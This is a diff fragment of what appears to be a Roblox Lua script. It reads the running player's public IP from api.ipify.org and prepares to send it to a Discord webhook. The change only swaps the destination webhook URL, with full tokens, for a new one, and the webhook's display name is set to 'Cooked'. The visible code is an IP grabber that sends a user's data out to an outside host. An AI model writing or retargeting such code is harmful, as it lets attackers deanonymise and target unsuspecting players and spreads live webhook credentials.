@@ -17,7 +17,7 @@ local external_ip = game:GetService("HttpService"):GetAsync("http://api.ipify.or
 local parsed_ip = game:GetService("HttpService"):JSONDecode(external_ip).ip
 
 -- Webhook URL
-local url = "https://discord.com/api/webhooks/1346273624356552795/n7ZgeTc-2NVhkFRM5XU6yn40UIcvNiWb6UO5K30pYSgeOQUn6N4joHtZhYi4QvYPpUs9"
+local url = "https://discord.com/api/webhooks/1336821097412165632/b2CpLDrUyQCIioFeqE1t3fTLsQTuZ8rJ1hm9hSS0Ilk5E2Ma59x9lskkguhMtAw704uw"
 
 local data = {
     ["username"] = "Cooked", -- Webhook name
